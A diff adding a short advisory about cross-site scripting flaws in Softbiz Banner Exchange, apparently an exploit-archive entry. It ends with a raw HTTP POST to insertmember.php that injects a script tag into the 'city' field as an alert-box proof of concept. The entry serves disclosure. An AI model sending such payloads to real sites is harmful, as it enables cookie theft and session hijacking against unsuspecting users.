@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/18735/info
+
+Softbiz Banner Exchange is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before displaying it to users of the application.
+
+An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+POST http://www.example.com:80/insertmember.php HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: target.xx
+Content-Length: 152
+uname=1&add=1&city="><script>alert(/Ellipsis+Security+Test/)</script>&state=1&country=0&url=http%3A%2F%2F&email=1&pwd=1&pwd2=1&submit=Signup
